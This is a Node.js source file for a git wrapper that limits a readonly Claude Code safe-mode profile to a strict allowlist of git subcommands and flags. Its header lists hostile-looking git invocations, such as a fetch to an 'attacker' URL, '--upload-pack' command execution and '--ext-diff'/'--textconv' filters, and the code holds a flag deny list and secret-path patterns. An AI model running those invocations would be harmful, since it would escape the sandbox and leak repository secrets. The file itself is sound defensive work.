#!/usr/bin/env node
/**
 * git-ro.mjs -- the only git access the "readonly" safe-mode profile gets (2026-11-13 review round,
 * fix 1). "code" keeps raw `git ...` prefixes (job-core.mjs's READ_GIT_PREFIXES/WRITE_GIT_PREFIXES);
 * this wrapper exists because raw git prefixes cannot be made readonly-safe at all, even ones that
 * LOOK read-only:
 *
 *   git log -1 --output=file            writes a file
 *   git diff --output=file              writes a file
 *   git show REV:path --output=file     writes a file
 *   git fetch --upload-pack="cmd" .      runs an arbitrary local command as a "server"
 *   git fetch https://attacker/...       exfiltrates to an attacker remote
 *   git fetch . HEAD:refs/heads/x        mutates refs
 *   git diff --no-index NUL <any file>   reads an arbitrary untracked file, including outside the repo
 *   git diff --ext-diff                  runs an arbitrary external diff command
 *   git log -p --textconv                runs an arbitrary textconv filter command
 *
 * A Claude Code `permissions.allow` rule is a prefix match on argv TEXT -- it has no way to express
 * "but not with --output/--no-index/--ext-diff/--textconv/--upload-pack/-c/-C/--git-dir/--work-tree
 * /--exec-path", and git accepts ABBREVIATED long options in many places (so even denying the exact
 * string "--output" would not catch "--out"). The only safe shape is therefore an ALLOWLIST checked
 * by exact string equality (never a prefix or substring match, and never a blocklist) against a
 * FIXED per-subcommand set of flags; the fixed set below is deliberately small.
 *
 * Subcommands (first CLI argument; the two-word forms require that exact literal second word too):
 *   status, diff, log, show, rev-parse, describe, ls-files, branch list, remote -v, worktree list
 *
 * Every invocation runs via execFile (no shell -- argv is never re-parsed by anything that honors
 * quoting/globbing/chaining) with:
 *   - a fixed cwd (the directory this script itself is invoked from, i.e. the job's workFolder)
 *   - `-c core.fsmonitor=false`, `--no-pager`, and (diff/log/show only) `--no-ext-diff`/
 *     `--no-textconv`, all hardcoded by this script, never caller-supplied
 *   - GIT_PAGER=cat, GIT_TERMINAL_PROMPT=0 in the environment, and GIT_EXTERNAL_DIFF deleted
 *     outright (not set to "" -- see buildGitArgv's comment on why that actually BREAKS diff)
 *   - a bounded timeout and a bounded output size (maxBuffer)
 *
 * Every caller-supplied token (flag or positional) is checked:
 *   - a token starting with "-" must EXACTLY equal one of this subcommand's ALLOWED_FLAGS, or the
 *     global ALWAYS_DENY set (checked first, defense in depth even though the allowlist alone
 *     already excludes everything not in it) matched it by name -- otherwise refused.
 *   - a positional token (a pathspec, revision, or REV:path) must not be an absolute path, must not
 *     resolve outside the repo root once resolved against it, and must not look like a secret file
 *     (.env, *.env, .env.*, anything under a .ssh/ directory) -- checked on the path half of a
 *     REV:path argument too.
 *
 * Honesty: secrets already committed into git history can still appear in this wrapper's own output
 * (e.g. a broad `log -p` that happens to touch a commit that added a secret file before it was
 * removed) -- the pathspec/REV:path checks above stop a DIRECT read of a secret path, they cannot
 * scrub an already-committed blob's content out of a diff/log that legitimately includes it. A
 * safe-mode readonly review should not be pointed at a repo with committed secrets.
 *
 * Usage: node git-ro.mjs <subcommand> [flags/pathspecs...]
 */
import { execFile } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";

export const EXIT = Object.freeze({ OK: 0, USAGE: 2, REFUSED: 10, EXEC_FAILED: 20, TIMEOUT: 21 });
export const TIMEOUT_MS = 15_000;
export const MAX_OUTPUT_BYTES = 2 * 1024 * 1024;

// Checked first, against every "-"-prefixed token, regardless of subcommand (defense in depth --
// the per-subcommand allowlists below never include any of these, so this can never change the
// outcome, only the refusal message). Exact-string/exact-prefix-before-"=" only, by design -- see
// the file header on why a blocklist alone would be unsafe; this is never the ONLY thing standing
// between a caller and one of these, the allowlist below is.
const ALWAYS_DENY_FLAGS = [
  "--output", "-o", "--no-index", "--ext-diff", "--textconv", "--upload-pack",
  "-c", "-C", "--exec-path", "--git-dir", "--work-tree",
];

function isAlwaysDenied(token) {
  const bare = token.split("=")[0];
  return ALWAYS_DENY_FLAGS.includes(bare) || ALWAYS_DENY_FLAGS.includes(token);
}

// Fixed git argv prefix per subcommand (never extended by caller input), the caller's own allowed
// flags, and whether trailing positional args (pathspecs/revisions) are accepted at all.
const SUBCOMMANDS = {
  status: { gitArgs: ["status"], allowedFlags: ["--short", "-s", "--branch", "-b", "--porcelain", "--long", "--ignored"], positionals: true, textconv: false },
  diff: { gitArgs: ["diff"], allowedFlags: ["--stat", "--name-only", "--name-status", "-u", "--cached", "--staged", "--no-color"], positionals: true, textconv: true },
  log: { gitArgs: ["log"], allowedFlags: ["--oneline", "--stat", "--name-only", "--name-status", "-p", "--graph", "--all", "--no-color", "-1", "-2", "-3", "-5", "-10", "-20", "-50"], positionals: true, textconv: true },
  show: { gitArgs: ["show"], allowedFlags: ["--stat", "--name-only", "--name-status", "--no-color"], positionals: true, textconv: true },
  "rev-parse": { gitArgs: ["rev-parse"], allowedFlags: ["--abbrev-ref", "--short", "--verify", "--is-inside-work-tree", "--show-toplevel"], positionals: true, textconv: false },
  describe: { gitArgs: ["describe"], allowedFlags: ["--tags", "--always", "--dirty", "--long"], positionals: true, textconv: false },
  "ls-files": { gitArgs: ["ls-files"], allowedFlags: ["--cached", "--others", "--ignored", "--exclude-standard", "--stage"], positionals: true, textconv: false },
  // branch/remote/worktree: the caller's SECOND token must be exactly this literal word (checked in
  // parseArgs below); no other flags or positionals are admitted for these three at all.
  "branch list": { gitArgs: ["branch", "--list"], allowedFlags: [], positionals: false, textconv: false },
  "remote -v": { gitArgs: ["remote", "-v"], allowedFlags: [], positionals: false, textconv: false },
  "worktree list": { gitArgs: ["worktree", "list"], allowedFlags: [], positionals: false, textconv: false },
};

// basename-shaped and directory-shaped secret patterns (see the file header's "honesty" note for
// what this does NOT cover). Applied to the path half of a REV:path argument too.
export function looksSecret(rawPath) {
  const norm = String(rawPath).replace(/\\/g, "/");
  const base = norm.split("/").filter(Boolean).pop() || "";
  if (/^\.env$/i.test(base)) return true; // .env
  if (/\.env$/i.test(base)) return true; // *.env (prod.env, etc.)
  if (/^\.env\./i.test(base)) return true; // .env.*  (.env.local, etc.)
  if (/(^|\/)\.ssh(\/|$)/i.test(norm)) return true; // .ssh/ anywhere in the path
  return false;
}

// True if `candidate` (resolved against repoRoot) stays inside repoRoot. Absolute candidates are
// refused outright (a readonly job should never need to name a path outside its own workFolder).
export function staysInRepo(candidate, repoRoot) {
  if (path.isAbsolute(candidate) || /^[A-Za-z]:[\\/]/.test(candidate) || candidate.startsWith("\\\\")) return false;
  const resolved = path.resolve(repoRoot, candidate);
  const rootWithSep = repoRoot.endsWith(path.sep) ? repoRoot : repoRoot + path.sep;
  return resolved === repoRoot || resolved.startsWith(rootWithSep);
}

// Validates one positional token (pathspec, revision, or REV:path). `--` (git's own "everything
// after this is a pathspec" separator) is always accepted verbatim. A REV:path argument is
// recognized by a ":" whose text before it is NOT a single-letter Windows drive ("C:\...") --
// everything after that first ":" is the path half, checked the same way a bare pathspec is.
export function validatePositional(arg, repoRoot) {
  if (arg === "--") return { ok: true };
  if (arg === "" || /\0/.test(arg)) return { ok: false, reason: "empty or contains a NUL byte" };
  const m = /^([^:]*):(.+)$/.exec(arg);
  const pathPart = m && !/^[A-Za-z]$/.test(m[1]) ? m[2] : arg;
  if (looksSecret(pathPart)) return { ok: false, reason: `${JSON.stringify(arg)} looks like a secret file path` };
  if (!staysInRepo(pathPart, repoRoot)) return { ok: false, reason: `${JSON.stringify(arg)} is absolute or escapes the repository` };
  return { ok: true };
}

// Returns { subcommandKey, rest } (rest = the args after the subcommand's fixed token(s)) or
// { error }. The two-word subcommands require their exact literal second word; anything else in
// that position (including a flag) is refused rather than silently treated as a positional arg.
function resolveSubcommand(argv) {
  if (argv.length === 0) return { error: "no subcommand given" };
  const [first, second] = argv;
  if (["branch", "remote", "worktree"].includes(first)) {
    const want = first === "branch" ? "list" : first === "remote" ? "-v" : "list";
    if (second !== want) {
      return { error: `"${first}" requires the exact second argument "${want}" (got ${JSON.stringify(second ?? null)})` };
    }
    return { subcommandKey: `${first} ${want}`, rest: argv.slice(2) };
  }
  if (Object.prototype.hasOwnProperty.call(SUBCOMMANDS, first)) return { subcommandKey: first, rest: argv.slice(1) };
  return { error: `unknown subcommand ${JSON.stringify(first)} (known: ${Object.keys(SUBCOMMANDS).filter((k) => !k.includes(" ")).join(", ")}, "branch list", "remote -v", "worktree list")` };
}

// Builds the full, validated git argv, or returns { error }. repoRoot: the resolved cwd this
// process is running in (never caller-supplied).
export function buildGitArgv(argv, repoRoot) {
  const resolved = resolveSubcommand(argv);
  if (resolved.error) return { error: resolved.error };
  const def = SUBCOMMANDS[resolved.subcommandKey];
  const extra = [];
  for (const token of resolved.rest) {
    if (token === "--") { extra.push(token); continue; } // git's own pathspec separator -- always safe, never a flag to allowlist
    if (token.startsWith("-")) {
      if (isAlwaysDenied(token)) return { error: `flag ${JSON.stringify(token)} is never permitted through git-ro.mjs` };
      if (!def.allowedFlags.includes(token)) {
        return { error: `flag ${JSON.stringify(token)} is not in the allowlist for "${resolved.subcommandKey}" ` +
          `(allowed: ${def.allowedFlags.length ? def.allowedFlags.join(", ") : "(none)"})` };
      }
      extra.push(token);
      continue;
    }
    if (!def.positionals) return { error: `"${resolved.subcommandKey}" does not accept any extra arguments (got ${JSON.stringify(token)})` };
    const v = validatePositional(token, repoRoot);
    if (!v.ok) return { error: `argument ${JSON.stringify(token)} refused: ${v.reason}` };
    extra.push(token);
  }
  // `-c diff.external=<empty>` does NOT disable an external diff the way it looks like it should --
  // git then tries to spawn the empty string as the external diff program and dies ("external diff
  // died, stopping"), confirmed empirically against a real repo while writing this wrapper's own
  // tests. `--no-ext-diff`/`--no-textconv` (real git flags documented for exactly this purpose) are
  // what actually suppress an external diff/textconv filter unconditionally, including one
  // configured in the repo's own .git/config -- not a config override this script fabricates.
  const fixed = ["-c", "core.fsmonitor=false", "--no-pager"];
  const diffSafety = def.textconv ? ["--no-ext-diff", "--no-textconv"] : [];
  return { argv: [...fixed, ...def.gitArgs, ...diffSafety, ...extra] };
}

// GIT_EXTERNAL_DIFF/GIT_DIFF_OPTS are deleted rather than set to "" -- an empty VALUE is not the
// same as an ABSENT variable to git (an empty GIT_EXTERNAL_DIFF is "run the empty string as my
// diff program", which dies; see buildGitArgv's comment on the equivalent -c mistake). Deleting
// means neither a value this process inherited nor one this script might set can matter --
// --no-ext-diff/--no-textconv (always appended for diff/log/show) are what actually disable them.
function gitEnv() {
  const env = { ...process.env, GIT_PAGER: "cat", PAGER: "cat", GIT_TERMINAL_PROMPT: "0" };
  delete env.GIT_EXTERNAL_DIFF;
  delete env.GIT_DIFF_OPTS;
  return env;
}

function runGit(argv, repoRoot) {
  return new Promise((resolve) => {
    execFile("git", argv, {
      cwd: repoRoot, shell: false, timeout: TIMEOUT_MS, maxBuffer: MAX_OUTPUT_BYTES,
      windowsHide: true, encoding: "utf8",
      env: gitEnv(),
    }, (err, stdout, stderr) => {
      if (err && err.killed && err.signal) {
        resolve({ exitCode: EXIT.TIMEOUT, stdout: stdout || "", stderr: `git-ro.mjs: timed out after ${TIMEOUT_MS}ms\n${stderr || ""}` });
        return;
      }
      if (err && err.code === undefined) {
        resolve({ exitCode: EXIT.EXEC_FAILED, stdout: stdout || "", stderr: `git-ro.mjs: ${err.message}\n${stderr || ""}` });
        return;
      }
      resolve({ exitCode: typeof err?.code === "number" ? err.code : 0, stdout: stdout || "", stderr: stderr || "" });
    });
  });
}

export async function runCli(argv, repoRoot = process.cwd()) {
  const built = buildGitArgv(argv, repoRoot);
  if (built.error) return { exitCode: EXIT.REFUSED, stdout: "", stderr: `git-ro.mjs: refused: ${built.error}\n` };
  return runGit(built.argv, repoRoot);
}

async function cliMain(argv) {
  if (argv.length === 0) {
    process.stderr.write("usage: git-ro.mjs <status|diff|log|show|rev-parse|describe|ls-files|\"branch list\"|\"remote -v\"|\"worktree list\"> [flags/pathspecs...]\n");
    process.exitCode = EXIT.USAGE;
    return;
  }
  const { exitCode, stdout, stderr } = await runCli(argv);
  if (stdout) process.stdout.write(stdout);
  if (stderr) process.stderr.write(stderr);
  process.exitCode = exitCode;
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  await cliMain(process.argv.slice(2));
}
